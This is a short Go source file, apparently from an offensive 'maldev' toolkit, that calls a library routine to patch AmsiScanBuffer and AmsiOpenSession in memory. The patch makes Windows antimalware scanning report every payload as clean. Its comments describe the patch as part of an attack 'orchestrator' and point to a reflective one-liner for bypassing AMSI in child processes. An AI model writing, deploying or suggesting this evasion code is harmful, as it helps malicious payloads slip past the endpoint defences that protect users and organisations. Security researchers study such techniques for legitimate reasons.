//go:build windows

package main

import "github.com/oioio-space/maldev/evasion/amsi"

// patchAMSI overwrites AmsiScanBuffer + AmsiOpenSession in THIS
// process so any in-process AMSI client (e.g. embedded
// PowerShell-via-COM, .NET CLR hosting) sees AMSI_RESULT_CLEAN
// regardless of payload content.
//
// Scope is per-process. Spawned child processes (powershell.exe,
// pwsh.exe, etc.) load their own amsi.dll fresh and are NOT
// covered. For child-process AMSI bypass, inject the standard
// reflective one-liner into the script being executed.
//
// Returns nil on success, the wrapped error otherwise. Caller
// should log but not abort -- our orchestrator works without AMSI
// patched, the patch is just defence-in-depth and demo of eating
// our own dog food.
func patchAMSI() error {
	return amsi.PatchAll(nil)
}
